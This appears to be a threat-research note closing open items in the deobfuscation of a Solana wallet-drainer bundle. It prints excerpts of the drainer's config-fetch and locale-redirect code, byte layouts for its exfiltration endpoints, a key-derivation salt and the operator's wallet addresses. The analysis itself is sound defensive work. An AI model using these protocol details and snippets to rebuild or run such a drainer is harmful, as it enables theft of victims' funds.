# Deobfuscation Gap Closure — 2026-11-14

Full deobfuscation run completed. All open items from the initial claims list
resolved. Output: `data/deobfuscated/bundle.deobfuscated.js` (34,134 lines,
1.4 MB). Pipeline: multi-pass Babel AST — 32,156 constants inlined, 1,090
string table lookups resolved, 559 global-name calls resolved, 3,467 string
concatenations folded, 3,219 noop calls unwrapped, 190 `with()` statements
removed, 6,915 computed member accesses simplified, 4,624 comma sequences
split, 29 CFF while-switch loops linearized.

---

## `/api/config` Call Site in Bundle

**CLOSED.** `bundle.deobfuscated.js` line 33587–33606.

```javascript
腣 = async function (tgid_arg) {
  let path = "/config" + (tgid_arg ? "?tgid=" + tgid_arg : "");
  let url = 夾.Ft(this.c, path);  // "https://" + host + "/api" + path
  let resp = await fetch(url, {
    signal: AbortSignal.Be(3000),
    headers: { "content-language": "en-US,q=0.8;en" }
  });
  if (!resp.ok) throw new Error(resp.statusText);
  let raw = new Uint8Array(await resp.arrayBuffer());
  let config = await 捿(raw, this.c.Se);  // AES-GCM: key = SHA-256(host + salt)
  return this.c.xt(config);
};
```

`?tgid=<telegram_user_id>` is passed when a Telegram WebApp context is
detected. Call chain: `addEventListener("load") → 籨(config, tgWebApp) →
貾.ho(tgid) → 腣(tgid)`. The `ho()` method retries with 250ms×N backoff
(up to 10 times). The `菣` function (line 33675) is the cache restore path:
reads `_0x12` from localStorage and restores config without a network call.

---

## `/api/locales` Called From Browser?

**CLOSED.** NO — confirmed definitively. `loadLocales()` / `bn()` exists in
the class (line 20699) but is never called from within the bundle. Modal
strings are baked into the bundle. `/api/locales` is for server-side tooling
(admin panel, affiliate dashboard) only.

---

## `/c/i`, `/c/c`, `/c/f`, `/api/process` — Full Layouts

**CLOSED.**

### POST `/api/process` — payload builder `焖()` (line 20619)

```
bytes  0–12   13 random bytes  (nonce)
bytes 13–16   u32 LE: attempt counter
bytes 17–48   32 bytes: victim wallet pubkey (base58 decoded)
byte  49       flow byte (餢[3])
bytes 50–51   u16 LE: account list length
bytes 52–N    account list (encoded by 詯())
              followed by signed transactions
```

Header size `緢 = 52` confirmed at line 20618.

### POST `/c/i` — payload builder `醭()` (line 20476)

```
bytes  0–14   15 random bytes (nonce)
bytes 15–22   u64 LE: victim SOL amount in lamports
bytes 23–54   32 bytes: victim wallet pubkey (base58 decoded)
bytes 55–N    account list from 詯()
bytes N–N+3   CRC32 checksum
```

Key: `SHA-256(apiHost + "c" + "B3ui3QZFrOPoGW7oMZgE4A")`

### POST `/c/i` — response parser `籮()` (line 20492)

Binary response, two branches depending on flag byte at offset ~13:

**Branch A:** `returns [session_id, null, flow_modifier]`

**Branch B:**
```
byte  13      session_id (u8)
byte  14      flag (determines branch)
bytes 15–46   32 bytes: base58 pubkey (map key)
bytes 47–48   u16 LE: string length
bytes 49–N    UTF-8 string: comma-separated values
returns [session_id, [pubkey_key, csv_value], flow_modifier]
```

### POST `/c/c/{a}/{b}` (line 20737–20741)

No binary body beyond `{}` (empty JSON). `a` = session_id, `b` = flow counter.

### POST `/c/f/{a}` — payload builder `措()` (line 20743–20748)

Body = packed byte arrays as base64. `a` = session_id.

---

## `/api/handler` Binary Event Format — All Fields Decoded

**CLOSED.** Full handler event serializer at `侔()` (line 32910):

```
offset 0:         u8    event kind (0=popup, 1=connect, 2=sign, 3=complete, 4=pre-sign)
offset 1:         [u8+] version string (length-prefixed, e.g. "1.18.4")
offset 1+vlen:    u32   4 random padding bytes
offset +4:        u8    tg_present (0 or 1)
  if tg_present:
    offset +0:    i64   tg.id (Telegram user ID, u64 LE)
    offset +8:    [u8+] tg.username (length-prefixed)
offset after tg:  [u8+] wallet name (length-prefixed, e.g. "Phantom")
offset +wlen:     32 bytes  victim wallet pubkey
offset +32:       u8    Ge (wallet connection type byte)
offset +1:        7 bytes   random padding
offset +7:        i64   SOL amount in lamports (u64 LE)
offset +8:        u8    token count
  for each token:
    64 bytes      token pubkey (encoded)
offset +N*64:     i32 LE  Mr * 10000 (portfolio SOL value at event time)
offset +4:        u8    ie flag (1 = insufficient balance shown)
offset +1:        u8    ut flag (1 = user-triggered variant)
offset +1:        [u8+] origin string (length-prefixed)
offset +olen:     [u8+] navigator.language[:5] (length-prefixed)
offset +ulen:     [u8+] encoded token list
```

Previously opaque fields:
- `opaque_4` (u32): 4 random padding bytes — no semantic meaning.
- `opaque_7` (7 bytes): random padding — no semantic meaning.
- `field_u64_b` (was 37888): `i32 LE` storing `Mr * 10000` — SOL price at
  event time. On kind-0 events, `Mr = 3.7888` (placeholder). On drain events,
  `Mr` = actual portfolio SOL value × rate.
- `marker` (always 2 in prior captures): this is `Ae = event_kind byte` —
  those were all kind-2 (sign) events.
- `token u32` (was 25000): `Mr * 10000` for that token's USD value at event time
  (25000 = $2.50 USDC in test captures).

---

## Exclusion/Watch-Address Set — 6 Addresses (Corrected from 29)

**CLOSED.** The balance gate exclusion set `診` (line 33400) contains 6 addresses,
not 29 as initially documented. The earlier count included other address arrays
in the string table. The 6 addresses are the operator's own monitoring wallets:

```
6ugBBLhRJqsuB1H4G6rGBMCyMWjdFpvpEUKnp6XCB1t7
9piPeQWJ7wxGmsWieeJhQKJ13DjJLga9j8CE5ydLTHC6
6ARSYR2B1aPWSjK11ZXDPmApgLgar3bCrm2BTYGS2jBK
4qti6FcMybVSLL2k4rqRQ3Ph1a2jGrzPmBN8Wmt4A5wr
HsVYhMDQRf6CkjtdUzqNDNRfDwsgw9nAX8feLVC3TAGp
4moJ9mfFDqFgGMp5UJUgcVhAaFtBxiapt9DVJE3LcVao
```

Wallets in this set receive the "watch address" response and are shown the
UI but not processed.

---

## New Finding — Locale Redirect Logic

`邞()` (line 33529):

```javascript
function 邞() {
  let idx = navigator.language.toLowerCase().indexOf("ru");
  if (idx === 0 || idx === 3) window.location.replace("https://solana.com/");
}
```

If `navigator.language` starts with `"ru"` (position 0) or has `"ru"` at
position 3 (e.g. `"xx-ru"`), the page immediately redirects to `solana.com`.
Called from the config parser's post-process hook (`慸` at line 33622) when
the relevant config flag is set. Consistent with `/api/locales` returning 404
for `ru` and `uk`.

---

## New Finding — `/api/config` Cached to `localStorage["_0x12"]`

After a successful config fetch, the raw AES-GCM ciphertext blob (not the
plaintext) is stored in `localStorage["_0x12"]` as base64. On subsequent page
loads, `菣()` reads and decrypts the cache without a network call, provided
it has not been invalidated. Cache invalidated by setting `this.c.Ne.dt = null`
(line 34060), which forces a fresh fetch on the next focus event.

---

## New Finding — `GET /api/config?tgid=N`

When a Telegram WebApp context is detected, the config fetch includes
`?tgid=<numeric_telegram_user_id>`. Allows the operator to serve per-Telegram-user
config overrides (e.g. whitelisting users, raising amounts for high-value targets
identified via `/api/visit` Telegram attribution).

---

## Open Items

| Item | Status |
|---|---|
| `/api/stats` parameters | **OPEN** — no client reference; server-only. Returns 422 without params. |
| Discriminators 14, 16, 17, 20 in ELF | **OPEN** — server-side only; not referenced in deobfuscated bundle |
| `DvuqUzFA…` pubkey role (220-byte config, ~1h on 2026-11-12) | **OPEN** — no further activation observed as of 2026-11-13 |

---

## Summary Table

| Item | Status |
|---|---|
| `/api/config` call site in bundle | CLOSED — line 33587, with `?tgid=` param |
| `/api/locales` called from browser? | CLOSED — NO |
| `/c/i` payload layout | CLOSED |
| `/c/i` response layout | CLOSED |
| `/c/c` body | CLOSED — empty JSON `{}` |
| `/c/f` body | CLOSED — packed byte arrays as base64 |
| `/api/process` header layout | CLOSED — 52-byte header confirmed |
| `/api/handler` opaque fields | CLOSED — all fields decoded |
| Exclusion set size | CLOSED — 6 addresses |
| CFF control flow structure | CLOSED — 29 loops linearized |
| Locale redirect logic | CLOSED (new finding) |
| Config cached to `_0x12` | CLOSED (new finding) |
| `/api/stats` parameters | OPEN |
| Disc 14/16/17/20 in ELF | OPEN |
| `DvuqUzFA…` pubkey role | OPEN |
